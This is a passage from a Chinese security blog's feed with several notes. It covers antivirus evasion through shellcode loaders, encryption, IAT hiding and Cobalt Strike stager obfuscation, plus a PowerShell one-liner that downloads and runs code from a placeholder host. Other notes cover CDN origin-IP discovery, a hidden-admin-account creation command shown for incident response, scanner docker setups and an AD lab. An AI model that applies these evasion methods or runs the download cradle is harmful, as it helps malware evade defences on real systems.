        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>免杀专题<br>exp检测流程和etl kettel</p><p>免杀借鉴</p><p>一个是学习其思想，自己实现并去特征免杀；</p><p>二是改造原有项目，自己查特征、去特征，经过测试也能达到免杀。</p><p>两大流派：</p><p>一是二进制流，利用汇编配合上C++，调用系统底层函数进内核的方式免杀。（杀软如果直接在用户态检测其行为特征会比较困难）</p><p>二是新工具新项目、小众工具流，其主要思想是寻找反病毒厂商未覆盖的方法和工具，一个是寻找新的语言工具和项目，跟厂商比速度。另一个是偏僻语言，用户量小，厂商一直并未发现或者工作重心不在上面。</p><p>杀软常见监控技术<br> 内存监控、文件监控、邮件监控、网页防护 、行为防护</p><p>杀毒软件常用检测方法：<br>通常分为静态特征查杀和动态行为检测(包括沙箱)<br>静态特征查杀，基于匹配特征码，与病毒库里面的md5进行比较。<br>                      做法：模糊哈希算法，机器学习跑模型 ， 效果：仅识别已知马）<br>                      绕过：利用myccl工具查找定位复合特征码 或手工（单步查杀找到特征码）</p><ol start="4"><li>动态行为检测-沙箱执行可以程序 <pre><code>               做法：hook关键api，监控注册表启动项，系统文件，防止对其修改                  绕过： 沙箱检测(检测线程数)，文件重命名检测 延时(类似cobaltstrike的睡眠机制，用钩子在睡眠时间内存权限设置读写，在非睡眠时改回可执行。)</code></pre></li></ol><p>1.熟悉各个杀软的查杀特性</p><p>火绒： 重点基于字符串去查杀，         做法：重点针对函数如regMovememory进行字符串混淆或更换函数</p><p>360： 重点基于函数具体触发的行为去查杀          做法： 延时，沙箱检测，文件重命名检测</p><p>Windows Defender： 重点基于特定位置，特征码去查杀    做法：找特征码去混淆</p><ol start="2"><li>针对各个杀软的特点进行自定义加载器</li></ol><p>免杀方式：</p><ol><li>源码免杀，（有源码时） 定位特征码，进行混淆【如内嵌汇编加载、强制类型转换、加花指令、多层跳转、加无效指令、替换/重写API、API伪调用等】或对shellcode进行异或 编码base64，AES加密等 </li><li>无源码免杀，在源码不好修改时，resourceHacker加资源，替换资源、vmp加壳、加签名、PE优化等组合使用</li><li>白名单exe/dll免杀-如rundll32、msbuild、mshta、cscript等</li><li>加载器分离免杀</li></ol><ol start="3"><li>简述自定义加载器的实现代码逻辑<br>  规避网络测绘-&gt;shellcode混淆-&gt;beacon去特征</li></ol><blockquote><p>自己编写shellcode远程加载器</p></blockquote><ol><li> Winhttp库或window sockets实现http请求（cs使用winInet库） –&gt; 容易暴露自己C2和文件服务器地址(域前置解决)</li><li> 对shellcode进行AES动态加密</li></ol><p>服务器</p><p>用flask框架，可以使用select多客户端模型 写一个web服务器，获取请求发过来的key值，用key对shellcode进行加密，响应给客户端</p><p>客户端（C++加载器）</p><p>        a. 客户端(C++加载器) 每次请求shellcode时随机生成一个key值，通过http请求将key发送到服务器</p><p>        b. 服务器使用key对shellcode进行AES加密或shellcode每一位与key进行异或操作，响应给客户端</p><p>        c. 客户端(C++加载器)用cryptopp库进行AES解密shellcode，virtualAlloc采用渐进式申请内存空间，使用memcpy拷贝shellcode到内存中，最后调用这个内存地址</p><p>甚至可以将loader是否也可以尝试一下，客户端仅保留下载loader和shellcode的功能</p><p>shellcode生成工具-donut，对Execute-Assembly进一步利用，将exe,dll,vbs,js转成shellcode<br>shellcode混淆器-Obfuscator ，xor，aes</p><p>shellcode加载器加载shellcode实现免杀上线，目前可能是使用最多的方法了。</p><p>免杀技术：</p><p>1. 经典技术：</p><p>特征码修改，花指令免杀，加壳免杀，内存免杀，二次编译免杀，分离免杀，资源修改，白名单免杀</p><p>花指令 —-&gt;杀毒软件本来是在0x00001000到0x00005000处找一个特征码。但因为我们填充了花指令，恶意代码跑到了0x00008000这个位置，就会导致特征码查杀失败，从而达到免杀目的。花指令撰写方法：找到程序的一个全0代码段。</p><p>2. 修改加载器特征</p><p>加载器特征= A「shellcode+硬编码字符串」 + B 「virtualAlloc，virtualProtect函数」</p><p>修改方法：</p><p>          对A进行 base64编码+加密（如xor）(更安全)，   </p><p>         对B插入花指令(无意义代码)， 可以使用HeapAlloc替换virtualAlloc函数</p><p><img src="../_resources/3c1ca696c82f4c19ab065713c394b78f.png" alt="927c866f742df44a494b8c9a485feb9b.png"></p><p>3. 内存免杀 （可绕过文件扫描）</p><p>shellcode直接加载进内存，对shellcode特征做隐藏处理，绕过内存扫描</p><p>做法： 采用渐进式申请一块内存，最后改为可执行，最后执行时做分离免杀策略</p><p>4. 分离免杀</p><p>shellcode加载器=S_0「shellcode_downloader」+ S_1「run_shellcode」</p><p>通常杀软只检测一个进程的行为，</p><p>做法： 使用windows管道，socket通道</p><p>分离免杀，将shellcode写入到文件中和加载器分离开，在加载器启动执行时再将shellcode从文件当中读取进来。</p><p>5. 修改资源</p><p>杀软会检测文件的描述，版本号，创建日期作为特征检测</p><p>做法： 使用restorator对目标修改资源文件</p><p>6. 隐藏IAT</p><p>杀软检测导入表中是否存在可疑函数</p><p>做法： opt1 调用getProcessAddress获取所需函数地址</p><p>opt2  用汇编从Teb里找到kernel32.dll地址，再从其导出表中获取所需系统函数</p><p>7. 二次编译免杀</p><p>使用msf中的多态编码器shikata_ga_nai</p><p>8. 偏僻语言编写加载器 如nim</p><p>如 python反序列化加载python加载器（已失效）</p><p>9. 系统函数白名单免杀-uuid方式（已失效)</p><p>利用系统函数UuidFromStringA( payload的uuid数组 ) 转化为shellcode加载进内存，</p><p>调用EnumSystemLocalesA(shellcode首地址 )</p><p>已有项目实现guid免杀</p><p>10. cs中更换beacon.dll，dnsb.dll等</p><p><a href="https://mp.weixin.qq.com/s/rEm17yOwX73vh7lcVESM8A">https://mp.weixin.qq.com/s/rEm17yOwX73vh7lcVESM8A</a> windows下免杀思路分享</p><p>11. powershell绕过</p><p>``powershell -c “IEX(New-Object  Net.WebClient).DownloadString(‘<a href="http://xxx.xxx.xxx/a&#39;)&quot;%60">http://xxx.xxx.xxx/a&#39;)&quot;`</a></p><p>` </p><p>     powershell混淆绕过  – 根据powershell语言特性，字符串转换，变量转换，编码，压缩等</p><p>修改加载器的特征</p><blockquote><p>对<code>func_get_delegate_type</code>，<code>func_get_proc_address</code>两个函数重命名替换，对函数里面的一些变量进行重新定义</p><p>重命名<code>$DoIt</code>为<code>$aaaa</code></p><p>修改IEX为I`EX</p><p>修改Invoke为Inv’+’oke</p><p>替换<code>$var_code</code>为<code>$acode</code></p></blockquote><p>  </p><blockquote><p>msf与cs的stager对比分析</p></blockquote><pre><code>相同点： 通过WinInet系列函数远程加载stage并使用VirtualAlloc为其分配一块rwx的内存空间，最后转去执行stage    </code></pre><p>  不同点： cs比msf多调用几个函数 InternetErrorDlg, GetDesktopWindow, GetLastError</p><ul><li> payload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载)<br>meterpreter加载顺序：stager-&gt;metsrv.dll-&gt;stdapi.dll<br>cs-beacon加载顺序： stgaer-&gt;beacon.dll</li><li>C2实现方式：<ul><li>meterpreter的handler实现：TCPServer结合resources实现的简易HTTP服务</li><li>Beacon的Listener实现：基于NanoHTTPD实现(成熟稳定)</li></ul></li><li>通信协议上差异：<br>  cs和msf均使用http/s进行数据通信，但具体传输方式上有差异<pre><code>  - meterpreter使用HTTP 1.1 ，默认使用keep-alive功能，且不能关闭 （不稳定）  - Beacon使用HTTP 1.1 ，但默认不开启keep-alive功能 且支持抖动特性</code></pre>具体的表现为在实际使用过程中,Meterpreter与C2服务器始终保持一条TCP连接,且对TCP连接的状态没有监控. 相对应的Beacon在请求任务/返回结果时会与C2建立连接,而在sleep阶段与C2没有网络连接. </li></ul><pre><code>    ETL： 数据抽取-转换-加载的过程数据抽取： 不同数据库数据清洗：            不完整的数据             错误数据               重复数据  数据转换：         不一致数据转换             数据粒度的转换               商务规则的计算</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>绕过CDN查找IP</title>
      <link href="Tools/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BEIP.html"/>
      <url>Tools/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BEIP.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="CDN简介"><a href="#CDN简介" class="headerlink" title="CDN简介"></a>CDN简介</h1><h2 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a><a href="https://help.aliyun.com/document_detail/27101.html">什么是CDN</a></h2><p>将web服务器的静态资源(HTML页面、js文件、css文件)及媒体文件(image,video,audio)缓存到CDN节点上，加快网站的响应速度。</p><p>假设您的加速域名为<code>www.a.com</code>，接入CDN开始加速服务后，当终端用户在北京发起HTTP请求时，处理流程如下图所示。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/2902102261/p275210.png" alt="CDN原理"></p><ol><li><p>当终端用户向<code>www.a.com</code>下的指定资源发起请求时，首先向LDNS（本地DNS）发起域名解析请求。                        </p></li><li><p>LDNS检查缓存中是否有<code>www.a.com</code>的IP地址记录。</p><p>如果有，则直接返回给终端用户；</p><p>如果没有，则向授权DNS查询。                        </p></li><li><p>当授权DNS解析<code>www.a.com</code>时，返回域名CNAME <code>www.a.tbcdn.com</code>对应IP地址。                        </p></li><li><p>域名解析请求发送至阿里云DNS调度系统，并为请求分配最佳节点IP地址。</p></li><li><p>LDNS获取DNS返回的解析IP地址。</p></li><li><p>用户获取解析IP地址。</p></li><li><p>用户向获取的IP地址发起对该资源的访问请求。                            </p><ul><li>如果该IP地址对应的节点已缓存该资源，则会将数据直接返回给用户，例如图中步骤7和8，此时请求结束。</li><li>如果该IP地址对应的节点未缓存该资源，则节点向源站发起对该资源的请求。获取资源后结合用户自定义配置的缓存策略，将资源缓存到CDN节点并返回给用户，例如图中的北京节点，此时请求结束。                             </li></ul></li></ol><h2 id="常见CDN提供商"><a href="#常见CDN提供商" class="headerlink" title="常见CDN提供商"></a>常见CDN提供商</h2><ul><li>阿里云CDN</li><li>腾讯云CDN</li><li>Cloudflare等</li></ul><h1 id="CDN判断与绕过"><a href="#CDN判断与绕过" class="headerlink" title="CDN判断与绕过"></a>CDN判断与绕过</h1><h2 id="判断网站是否使用CDN"><a href="#判断网站是否使用CDN" class="headerlink" title="判断网站是否使用CDN"></a>判断网站是否使用CDN</h2><ul><li>通过 <code>http://ping.chinaz.com/</code> 判断网站响应IP数量判断使用CDN</li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211010232033.png"></p><ul><li><code>dig www.example.com A </code> </li><li><code>nslookup www.example.com</code></li><li><a href="https://www.cdnplanet.com/tools/cdnfinder">https://www.cdnplanet.com/tools/cdnfinder</a></li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211010235918.png"></p><h2 id="CDN绕过方法"><a href="#CDN绕过方法" class="headerlink" title="CDN绕过方法"></a>CDN绕过方法</h2><h3 id="1-子域名绕过"><a href="#1-子域名绕过" class="headerlink" title="1. 子域名绕过"></a>1. 子域名绕过</h3><p>主域名：example.com   IP:    192.168.1.2</p><p>源站(<a href="http://www.example.com/">www.example.com</a> )IP：192.168.1.2</p><p>子域名 sub.example.com   IP可能性：</p><ul><li>192.168.1.2   同源站</li><li>192.168.1.3-254  同网段</li><li>非192.168.1.*的其他IP  （子域名绕过不可用)</li></ul><h3 id="2-邮件服务器"><a href="#2-邮件服务器" class="headerlink" title="2. 邮件服务器"></a>2. 邮件服务器</h3><p>CDN加速通过配置DNS的CNAME记录实现</p><p>邮件服务器通过DNS的MX记录实现，一般邮件服务器即目标源IP</p><p>查看对方邮件原文</p><h3 id="3-国外地址请求-https-get-site-ip-com"><a href="#3-国外地址请求-https-get-site-ip-com" class="headerlink" title="3. 国外地址请求 https://get-site-ip.com/"></a>3. 国外地址请求 <a href="https://get-site-ip.com/">https://get-site-ip.com/</a></h3><p>鉴于CDN服务费用，一般仅国内加速</p><h3 id="4-phpinfo页面"><a href="#4-phpinfo页面" class="headerlink" title="4. phpinfo页面"></a>4. phpinfo页面</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211010233651.png"></p><h3 id="5-网络空间引擎搜索特定字符串-md5"><a href="#5-网络空间引擎搜索特定字符串-md5" class="headerlink" title="5. 网络空间引擎搜索特定字符串[md5]"></a>5. 网络空间引擎搜索特定字符串[md5]</h3><h3 id="6-DNS历史记录"><a href="#6-DNS历史记录" class="headerlink" title="6. DNS历史记录"></a>6. <a href="https://site.ip138.com/">DNS历史记录</a></h3><h1 id="获取CDN后如何绑定指向源站IP"><a href="#获取CDN后如何绑定指向源站IP" class="headerlink" title="获取CDN后如何绑定指向源站IP"></a>获取CDN后如何绑定指向源站IP</h1><p>修改本地hosts文件</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网站架构</title>
      <link href="Evolution/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84.html"/>
      <url>Evolution/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="建站类型"><a href="#建站类型" class="headerlink" title="建站类型"></a>建站类型</h1><p>网站URL结构： <code>[协议]:[域名/IP]:[端口]/[URI]</code></p><p>可根据 <code>[域名/IP]</code>  <code>[端口]</code>  <code>[URI]</code> 的不同搭建不同网站</p><h2 id="域名型-根据-域名-IP-不同搭建的web"><a href="#域名型-根据-域名-IP-不同搭建的web" class="headerlink" title="域名型-根据 域名/IP 不同搭建的web"></a>域名型-根据 <em>域名/IP</em> 不同搭建的web</h2><ol><li><p>域名</p><ul><li><p>后缀不同 A<br>example.com  A 192.168.1.100<br>example.org   A 192.168.1.100/192.168.1.200/10.1.2.250</p></li><li><p>前缀不同<br><a href="http://www.example.com/">www.example.com</a>   A   192.168.1.200<br>bbs.example.com   A 10.1.2.250</p></li><li><p> DNS的CNAME记录<br>example.com   CNAME    example.cyduncdn.com</p></li></ul></li><li><p>IP</p><p>192.168.1.2</p><p>192.168.1.3-254 </p></li></ol><h2 id="端口型-根据-端口-不同搭建的Web"><a href="#端口型-根据-端口-不同搭建的Web" class="headerlink" title="端口型-根据 端口 不同搭建的Web"></a>端口型-根据 <em>端口</em> 不同搭建的Web</h2><p>example.com:8080</p><p>example.com:8081</p><h2 id="目录型-根据-URI-不同搭建的web"><a href="#目录型-根据-URI-不同搭建的web" class="headerlink" title="目录型-根据 URI 不同搭建的web"></a>目录型-根据 <em>URI</em> 不同搭建的web</h2><p>example.com/phpstudy/</p><p>example.com/xss-lab/</p><h2 id="旁注和C段"><a href="#旁注和C段" class="headerlink" title="旁注和C段"></a>旁注和C段</h2><p>旁注- 同服务器不同站点</p><p>C段-同网段不同服务器不同站点</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>win防锁屏小脚本</title>
      <link href="Tools/win%E9%98%B2%E9%94%81%E5%B1%8F%E5%B0%8F%E8%84%9A%E6%9C%AC.html"/>
      <url>Tools/win%E9%98%B2%E9%94%81%E5%B1%8F%E5%B0%8F%E8%84%9A%E6%9C%AC.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="防锁屏-vbe"><a href="#防锁屏-vbe" class="headerlink" title="防锁屏.vbe"></a>防锁屏.vbe</h2><pre><code class="vbscript">Dim wshShellSet wshShell = CreateObject(&quot;Wscript.Shell&quot;)msgbox &quot;µã»÷È·¶¨ºó£¬¿ªÊ¼¶¨Ê±Ä£Äâ¼üÅÌÊäÈë£¬ÒÔ·ÀÖ¹ËøÆÁ¡£Òª½áÊøÄ£ÄâÔòÔËÐÐ ½áÊø.bat&quot;Do While 2&gt;1        wscript.Sleep 60000        wshShell.SendKeys &quot;&#123;NumLock&#125;&quot;        wshShell.SendKeys &quot;&#123;NumLock&#125;&quot;Loop</code></pre><h2 id="结束锁屏脚本"><a href="#结束锁屏脚本" class="headerlink" title="结束锁屏脚本"></a>结束锁屏脚本</h2><pre><code class="vbscript">taskkill /f /im wscript.exe</code></pre><p>s</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>隐藏账户排查</title>
      <link href="Response/%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5.html"/>
      <url>Response/%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>隐藏账户排查</p><h1 id="隐藏账户排查"><a href="#隐藏账户排查" class="headerlink" title="隐藏账户排查"></a>隐藏账户排查</h1><h2 id="创建隐藏账户"><a href="#创建隐藏账户" class="headerlink" title="创建隐藏账户"></a>创建隐藏账户</h2><p>用户名$ 方式创建的用户，使用<code>net user</code>方式查看不到<br>参考 <a href="https://www.freebuf.com/articles/system/258981.html">隐藏账户创建</a><br>D盾可查到</p><pre><code class="zsh">net user test$ passwd /add &amp;&amp; net localgroup administrators test$ /add  </code></pre><h2 id="排查隐藏账户-lusrmgr方式"><a href="#排查隐藏账户-lusrmgr方式" class="headerlink" title="排查隐藏账户-lusrmgr方式"></a>排查隐藏账户-lusrmgr方式</h2><p><code>win+R</code> 输入 <code>lusrmgr.msc</code> 打开 <strong>本地用户和组</strong>，查看是否存在$结尾的账户</p><h2 id="排查隐藏账户-regedit方式"><a href="#排查隐藏账户-regedit方式" class="headerlink" title="排查隐藏账户-regedit方式"></a>排查隐藏账户-regedit方式</h2><p><code>win+R</code> 输入 <code>regedit</code> 打开 <strong>注册表编辑器</strong> ，定位到 <code>HKEY_LOCAL_MACHINE/SAM/SAM</code>,右键最后一个 <strong>SAM</strong> 选择<strong>权限</strong> 将权限勾选为<strong>完全控制</strong>，然后确定，关闭注册表编辑器<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20210818143221_regedit.png" alt="regedit"></p><p>最后定位到 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>查看所有账户<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20210818143712_regedit-Names.png" alt="regiedit-Names"></p><h2 id="端口排查"><a href="#端口排查" class="headerlink" title="端口排查"></a>端口排查</h2><ul><li><code>win+R</code> 输入 <code>cmd</code> 运行 <code>netstat -nao</code> 查看异常端口连接找到对应PID</li><li><code>win+R</code> 输入 <code>taskmgr</code> 打开任务管理器 点击<strong>详细信息</strong>查看对应的PID进程信息，右键进程打开文件所在位置，可查看当前进程对应的程序</li></ul><h2 id="启动项及计划任务排查"><a href="#启动项及计划任务排查" class="headerlink" title="启动项及计划任务排查"></a>启动项及计划任务排查</h2><ul><li>系统启动菜单<code>C:\Users\frame\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> </li><li><code>win+R</code> 输入 <code>msconfig</code> 打开系统配置，查看<strong>启动</strong></li><li> <code>win+R</code> 输入 <code>regedit</code> 打开注册表编辑器，查看以下路径是否存在<br><code>&#123;HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER&#125;\Software\Microsoft\Windows\CurrentVersion\&#123;Run|RunOnce&#125;</code></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Response </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>漏扫AWVS-Nessus搭建-docker版</title>
      <link href="Tools/%E6%BC%8F%E6%89%ABAWVS-Nessus%E6%90%AD%E5%BB%BA-docker%E7%89%88.html"/>
      <url>Tools/%E6%BC%8F%E6%89%ABAWVS-Nessus%E6%90%AD%E5%BB%BA-docker%E7%89%88.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="AWVS搭建"><a href="#AWVS搭建" class="headerlink" title="AWVS搭建"></a>AWVS搭建</h2><pre><code class="shell">docker pull xrsec/awvs:latestdocker run -it -d  --name awvs  -p 3443:3443  --restart=always  xrsec/awvs:latest</code></pre><p>访问 <a href="https://ip:3443/">https://ip:3443</a></p><p>账户密码  <code> awvs@awvs.com/Awvs@awvs.com</code></p><h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a><a href="https://github.com/stevemcgrath/docker-nessus_scanner">Nessus</a></h2><pre><code class="shell">docker pull stevemcgrath/nessus_scanner:latestdocker run -dt \    -e LINKING_KEY=&#123;LINKING_KEY&#125;\    -e SCANNER_NAME=&#123;SCANNER_NAME&#125;\    --name nessus_scanner\    stevemcgrath/nessus_scanner:latest</code></pre><h2 id="AWVS-amp-NESSUS"><a href="#AWVS-amp-NESSUS" class="headerlink" title="AWVS&amp;NESSUS"></a><a href="https://mp.weixin.qq.com/s/ecPLUbVGuaHMhPMPE6oWmA">AWVS&amp;NESSUS</a></h2><pre><code class="shell">docker pull leishianquan/awvs-nessus:v04docker run -it -d -p 13443:3443 -p 8834:8834 leishianquan/awvs-nessus:v04echo  `docker ps -a | grep  awvs-nessus` | awk &#39;&#123;print $1&#125;&#39;docker exec –it 容器id   /bin/bash/etc/init.d/nessusd start</code></pre><p>访问 <a href="https://ip:8834/">https://ip:8834/</a></p><p>用户密码 <code>leishi/leishianquan</code></p><p><a href="https://www.showdoc.com.cn/903737475535911/4808693697997263">https://www.showdoc.com.cn/903737475535911/4808693697997263</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AD域环境搭建</title>
      <link href="askDing/AD%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
      <url>askDing/AD%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="AD小型域环境搭建"><a href="#AD小型域环境搭建" class="headerlink" title="AD小型域环境搭建"></a>AD小型域环境搭建</h1><p>参考<a href="https://mp.weixin.qq.com/s/lsIyKJXjywh83btdz186Vw">快速搭建精简的小型域环境</a></p><ul><li>WinServer 2016     10.211.55.5  (DC)</li><li>Win7 专业版           10.211.55.6</li><li>Win10 专业版         10.211.55.3</li></ul><h1 id="在Winserver部署-Active-Directory域服务"><a href="#在Winserver部署-Active-Directory域服务" class="headerlink" title="在Winserver部署 Active Directory域服务"></a>在Winserver部署 <code>Active Directory域服务</code></h1><h2 id="更改本地DNS指向本机地址"><a href="#更改本地DNS指向本机地址" class="headerlink" title="更改本地DNS指向本机地址"></a>更改本地DNS指向本机地址</h2><pre><code class="powershell"># 设置静态ipnetsh interface ip set addr &quot;本地连接&quot; static 192.168.0.1 255.255.255.0 192.168.0.254 1netsh interface ip set dns &quot;本地连接&quot; static 202.103.24.68netsh interface ip add dns &quot;本地连接&quot; 10.211.55.5# 设置动态ipnetsh interface ip set addr &quot;本地连接&quot; dhcpnetsh interface ip set dns &quot;本地连接&quot; dhcp</code></pre><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109300955989AD_DNS.png"></p><h2 id="部署Active-Directory域服务"><a href="#部署Active-Directory域服务" class="headerlink" title="部署Active Directory域服务"></a>部署Active Directory域服务</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301046684add_ad.png"></p><h2 id="配置Active-Directory域服务"><a href="#配置Active-Directory域服务" class="headerlink" title="配置Active Directory域服务"></a>配置Active Directory域服务</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301036336ad_conf.png"></p><p>⚠️ 指定与控制功能时，不能选择 <strong>只读域控制器(RODC)</strong></p><h2 id="添加域用户"><a href="#添加域用户" class="headerlink" title="添加域用户"></a>添加域用户</h2><ul><li>zhangsan    qwe@123</li><li>lisi               qwe@123</li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301140291ad_user.png"></p><p>验证是否安装成功</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301142454ad_nettime.png"></p><h1 id="添加域成员机"><a href="#添加域成员机" class="headerlink" title="添加域成员机"></a>添加域成员机</h1><h2 id="更改DNS指向域控-10-211-55-5"><a href="#更改DNS指向域控-10-211-55-5" class="headerlink" title="更改DNS指向域控 10.211.55.5"></a>更改DNS指向域控 <code>10.211.55.5</code></h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301148913add_dns.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301154047ad_dns.png"></p><h2 id="win7-10-入-出域操作"><a href="#win7-10-入-出域操作" class="headerlink" title="win7/10 入/出域操作"></a>win7/10 入/出域操作</h2><ul><li><p>powershell(管理员)</p><p>打开powershell</p></li></ul><pre><code class="shell">hostname    # 查看当前主机名rename-computer -NewName win10    # win10 更改NetBIOS名add-computer -domain &quot;域名&quot; -cred &quot;域名\授权用户&quot; -passthru  ;restart-computerremove-computer -credential &quot;域名\授权用户&quot; -passthru -verbose; restart-computer</code></pre><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301226617ad_join.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301236181ad_remuser.png"></p><ul><li><code>win+R</code> 运行 <code>sysdm.cpl</code></li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301249165ad_join.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301251093ad_join.png"></p><p>出域</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301254268ad_remo.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于同步盘的一些方案</title>
      <link href="Tools/%E5%85%B3%E4%BA%8E%E5%90%8C%E6%AD%A5%E7%9B%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%A1%88.html"/>
      <url>Tools/%E5%85%B3%E4%BA%8E%E5%90%8C%E6%AD%A5%E7%9B%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%A1%88.html</url>
      
